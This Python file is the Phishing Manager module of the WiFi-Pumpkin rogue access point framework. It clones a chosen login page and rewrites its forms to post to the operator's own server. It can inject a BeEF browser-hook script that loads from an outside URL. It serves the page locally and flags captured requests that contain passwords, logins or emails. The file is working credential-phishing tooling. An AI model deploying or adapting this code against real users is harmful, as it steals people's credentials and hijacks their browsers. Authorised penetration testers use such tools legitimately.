from os import popen
from urllib2 import urlopen, URLError
from bs4 import BeautifulSoup
import core.utility.constants as C
from core.main import QtGui, QtCore
from core.servers.http_handler.ServerHTTP import ServerThreadHTTP
from core.utility.extract import Beef_Hook_url
from core.utility.settings import frm_Settings
from core.utils import ThreadPhishingServer
from core.utility.threads import ProcessThread

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes functionality
    for Phishing attack.

Copyright:
    Copyright (C) 2015-2017 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""
class frm_PhishingManager(QtGui.QWidget):
    def __init__(self, parent = None):
        super(frm_PhishingManager, self).__init__(parent)
        self.label = QtGui.QLabel()
        self.Main  = QtGui.QVBoxLayout()
        self.config = frm_Settings()
        self.session = str()
        self.setWindowTitle('Phishing Manager')
        self.ThreadTemplates = {'Server':[]}
        self.setGeometry(0, 0, 630, 100)
        self.loadtheme(self.config.get_theme_qss())
        self.center()
        self.UI()

    def loadtheme(self,theme):
        sshFile=('core/%s.qss'%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QtGui.QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def StatusServer(self,bool):
        if bool:
            self.statusLabel.setText("[ON]")
            self.statusLabel.setStyleSheet("QLabel {  color : green; }")
        else:
            self.statusLabel.setText("[OFF]")
            self.statusLabel.setStyleSheet("QLabel {  color : red; }")

    def UI(self):
        self.statusBar   = QtGui.QStatusBar()
        self.statusLabel = QtGui.QLabel('')
        self.statusBar.addWidget(QtGui.QLabel('Status HTTP Server::'))
        self.StatusServer(False)
        self.statusBar.addWidget(self.statusLabel)
        # left page
        self.frmHtml     = QtGui.QFormLayout()
        self.frmOutput   = QtGui.QFormLayout()

        # right page
        self.frmSettings = QtGui.QFormLayout()
        self.frmCheckBox = QtGui.QFormLayout()
        self.frmClone    = QtGui.QFormLayout()
        self.frmButtons  = QtGui.QFormLayout()
        self.frmright    = QtGui.QFormLayout()
        self.frmleft     = QtGui.QFormLayout()

        #group checkbox
        self.check_custom   = QtGui.QRadioButton('index.html  ')
        self.check_server   = QtGui.QRadioButton('Set Directory')
        self.check_beef     = QtGui.QCheckBox('Enable Beef')
        self.check_clone    = QtGui.QRadioButton('Website clone')
        self.check_custom.setChecked(True)

        # group clone site
        self.cloneLineEdit  = QtGui.QLineEdit(self)
        self.cloneLineEdit.setText('example.com/login')
        self.cloneLineEdit.setEnabled(False)

        # group settings
        self.EditBeef       = QtGui.QLineEdit(self)
        self.EditDirectory  = QtGui.QLineEdit('/var/www')
        self.txt_redirect   = QtGui.QLineEdit(self)
        self.BoxPort        = QtGui.QSpinBox(self)
        self.EditBeef.setEnabled(False)
        self.EditDirectory.setEnabled(False)
        self.BoxPort.setMaximum(65535)
        self.BoxPort.setValue(80)

        # group left
        self.Group_Html  = QtGui.QGroupBox(self)
        self.Group_List   = QtGui.QGroupBox(self)
        self.Group_Html.setTitle('index.html:')
        self.Group_List.setTitle('Requests:')

        self.txt_html       = QtGui.QTextEdit(self)
        self.ListOutputWid  = QtGui.QListWidget(self)
        self.txt_html.setFixedWidth(450)
        self.frmHtml.addRow(self.txt_html)
        self.frmOutput.addRow(self.ListOutputWid)

        # button stop,start
        self.btn_start_template = QtGui.QPushButton('Start Server')
        self.btn_stop_template  = QtGui.QPushButton('Stop Server')
        self.btn_start_template.setIcon(QtGui.QIcon('icons/start.png'))
        self.btn_stop_template.setIcon(QtGui.QIcon('icons/Stop.png'))
        self.btn_stop_template.setEnabled(False)
        self.btn_start_template.setFixedWidth(110)
        self.btn_stop_template.setFixedWidth(110)
        self.btn_start_template.clicked.connect(self.start_server)

        # group create
        self.GroupSettings  = QtGui.QGroupBox(self)
        self.GroupCheckBox  = QtGui.QGroupBox(self)
        self.GroupCloneSite = QtGui.QGroupBox(self)
        self.GroupSettings.setTitle('settings:')
        self.GroupCheckBox.setTitle('Options:')
        self.GroupCloneSite.setTitle('clone:')


        # left layout
        self.txt_html.setPlainText('<html>\n<head>\n<title>WiFi-Pumpkin Phishing </title>'
        '\n</head>\n<body>\n'
        '\n<h3 align=\'center\'>WiFi-Pumpkin Framework</h3>\n'
        '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
        '\n</body>\n</html>')

        # connect checkbox
        self.check_beef.clicked.connect(self.check_options)
        self.check_custom.clicked.connect(self.check_options)
        self.check_server.clicked.connect(self.check_options)
        self.check_clone.clicked.connect(self.check_options)

        # connect buttons
        self.btn_stop_template.clicked.connect(self.killThread)

        # checkboxs
        self.frmCheckBox.addRow(self.check_custom,self.check_server)
        self.frmCheckBox.addRow(self.check_beef,self.check_clone)
        self.frmCheckBox.addRow(self.GroupSettings)

        # settings
        self.frmSettings.addRow('IP Address:',self.txt_redirect)
        self.frmSettings.addRow('Port:',self.BoxPort)
        self.frmSettings.addRow("Beef Hook URL:",self.EditBeef)
        self.frmSettings.addRow("SetEnv PATH  :",self.EditDirectory)

        # buttons
        self.frmButtons.addRow(self.btn_start_template,self.btn_stop_template)

        # clone
        self.frmClone.addRow(self.cloneLineEdit)

        # page right
        self.GroupCheckBox.setLayout(self.frmCheckBox)
        self.GroupSettings.setLayout(self.frmSettings)
        self.GroupCloneSite.setLayout(self.frmClone)
        self.frmright.addRow(self.GroupCheckBox)
        self.frmright.addRow(self.GroupCloneSite)
        self.frmright.addRow(self.GroupSettings)
        self.frmright.addRow(self.frmButtons)

        # page left
        self.Group_Html.setLayout(self.frmHtml)
        self.Group_List.setLayout(self.frmOutput)
        self.frmleft.addRow(self.Group_Html)
        self.frmleft.addRow(self.Group_List)

        layout = QtGui.QHBoxLayout()
        layout.addLayout(self.frmleft)
        layout.addLayout(self.frmright)

        self.Main.addLayout(layout)
        self.Main.addWidget(self.statusBar)
        self.setLayout(self.Main)

    @QtCore.pyqtSlot(QtCore.QModelIndex)
    def check_options(self,index):
        if self.check_custom.isChecked():
            self.txt_html.setEnabled(True)
        else:
            self.txt_html.setEnabled(False)
        if self.check_clone.isChecked():
            self.cloneLineEdit.setEnabled(True)
        else:
            self.cloneLineEdit.setEnabled(False)
        if self.check_beef.isChecked():
            self.EditBeef.setEnabled(True)
        else:
            self.EditBeef.setEnabled(False)
        if self.check_server.isChecked():
            self.EditDirectory.setEnabled(True)
        else:
            self.EditDirectory.setEnabled(False)

    def start_server(self):
        if len(str(self.txt_redirect.text())) == 0:
            return QtGui.QMessageBox.warning(self,'localhost','Ip Address not found.')
        if self.check_server.isChecked():
            if len(popen('which php').read().split('\n')[0]) == 0:
                return QtGui.QMessageBox.warning(self,'Requirement Software',
                'php-5 is not installed \n\ntry: install sudo apt-get install php5')
        if self.check_clone.isChecked():
            if len(self.cloneLineEdit.text()) == 0:
                return QtGui.QMessageBox.warning(self,'Clone','input clone empty')
            site = str(self.cloneLineEdit.text())
            if not str(self.cloneLineEdit.text()).startswith('http://'):
                site = 'http://' + str(self.cloneLineEdit.text())
            if self.checkRequests(site):
                self.ServerHTTPLoad = ServerThreadHTTP(str(self.txt_redirect.text()),
                self.BoxPort.value(),redirect=str(self.cloneLineEdit.text()),
                directory=C.TEMPLATE_CLONE,session=self.session)
                self.ThreadTemplates['Server'].append(self.ServerHTTPLoad)
                self.ServerHTTPLoad.requestHTTP.connect(self.ResponseSignal)
                self.btn_start_template.setEnabled(False)
                self.btn_stop_template.setEnabled(True)
                self.ServerHTTPLoad.setObjectName('THread::: HTTP Clone')
                self.ServerHTTPLoad.start()
                self.ServerHTTPLoad.sleep(5)
                a = urlopen('http://{}:{}'.format(str(self.txt_redirect.text()),self.BoxPort.value()))
                if a.getcode() == 200:
                    self.StatusServer(True)
                    self.emit(QtCore.SIGNAL('Activated( QString )'),'started')

        elif self.check_server.isChecked():
            self.DirectoryPhishing(Path=str(self.EditDirectory.text()))
            self.emit(QtCore.SIGNAL('Activated( QString )'),'started')

        elif self.check_custom.isChecked():
            self.html = BeautifulSoup(str(self.txt_html.toPlainText()),'lxml')
            self.CheckHookInjection(self.html,C.TEMPLATE_PH)
            self.proc_Web_server  = ProcessThread({'python':['-m',
            'SimpleHTTPServer','{}'.format(self.BoxPort.value())]},
            C.TEMP_CUSTOM)
            self.proc_Web_server._ProcssOutput.connect(self.get_output_webserver)
            self.proc_Web_server.start()
            self.ThreadTemplates['Server'].append(self.proc_Web_server)
            self.emit(QtCore.SIGNAL('Activated( QString )'), 'started')
            self.btn_start_template.setEnabled(False)
            self.btn_stop_template.setEnabled(True)
            self.StatusServer(True)

            # old thread start web server
            # self.ServerHTTPLoad = ServerThreadHTTP(str(self.txt_redirect.text()),
            # self.BoxPort.value(),redirect=str(self.cloneLineEdit.text()),
            # directory=C.TEMPLATE_PH,session=self.session)
            # self.ThreadTemplates['Server'].append(self.ServerHTTPLoad)
            # self.ServerHTTPLoad.requestHTTP.connect(self.ResponseSignal)
            # self.btn_start_template.setEnabled(False)
            # self.btn_stop_template.setEnabled(True)
            # self.ServerHTTPLoad.setObjectName('THread::: HTTP Clone')
            # self.ServerHTTPLoad.start()
            # self.StatusServer(True)
            # self.emit(QtCore.SIGNAL('Activated( QString )'),'started')

    def get_output_webserver(self,data):
        print data

    def DirectoryPhishing(self,Path=None):
        popen('service apache2 stop')
        self.Tphishing = ThreadPhishingServer(['php', '-S','{}:{}'.format(
        str(self.txt_redirect.text()),str(self.BoxPort.value())),'-t',Path])
        self.Tphishing.send.connect(self.ResponseSignal)
        self.Tphishing.setObjectName('Server PHP::'+Path)
        self.ThreadTemplates['Server'].append(self.Tphishing)
        self.Tphishing.start()
        while True:
            if self.Tphishing.process != None:
                break
        self.btn_start_template.setEnabled(False)
        self.btn_stop_template.setEnabled(True)
        self.StatusServer(True)

    def ResponseSignal(self,resp):
        form_ = ['pass','login','user','email']
        try:
            newItem = QtGui.QListWidgetItem(self.ListOutputWid)
            newItem.setText(resp)
            for tag in form_:
                if tag in str(resp).lower():
                    newItem.setTextColor(QtCore.Qt.green)
                    break
            self.ListOutputWid.addItem(newItem)
            self.ListOutputWid.scrollToBottom()
        except Exception:
            pass

    def checkRequests(self,siteName):
        try:
            html = urlopen(siteName).read()
            request = BeautifulSoup(html,'lxml')
            try:
                for tag in request.find_all('form'):
                    tag['method'],tag['action'] ='post',''
            except Exception: pass
            self.CheckHookInjection(request,C.TEMPLATE_CLONE)
        except URLError:
            QtGui.QMessageBox.warning(self,'Request HTTP','It seems like the server is down.')
            return False
        return True

    def cloneWebsite(self):
        if len(self.cloneLineEdit.text()) == 0:
            return QtGui.QMessageBox.warning(self,'Clone website','input clone empty')
        site = str(self.cloneLineEdit.text())
        if not str(self.cloneLineEdit.text()).startswith('http://'):
            site = 'http://' + str(self.cloneLineEdit.text())
        if self.checkRequests(site):
            self.btn_Clone_page.setText('Cloned')
            return self.btn_Clone_page.setEnabled(False)

    def killThread(self):
        if hasattr(self,'proc_Web_server'): self.proc_Web_server.stop()
        if self.ThreadTemplates['Server'] == []: return
        for thread in self.ThreadTemplates['Server']: thread.stop()
        self.ListOutputWid.clear()
        self.btn_start_template.setEnabled(True)
        self.btn_stop_template.setEnabled(False)
        self.StatusServer(False)

    def CheckHookInjection(self,rasp,Save):
        if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
            self.hook = '<script type="text/javascript" src="%s"></script>'%str(self.EditBeef.text())
            html_final = Beef_Hook_url(rasp,self.hook)
            if html_final != None:rasp = html_final
            else: QtGui.QMessageBox.information(self,'Error Hook Inject Page',
                'Hook Url not injected,not found tag "<body>"')
        with open(Save,'w') as f:
            f.write(str(rasp))
            f.close()
        return rasp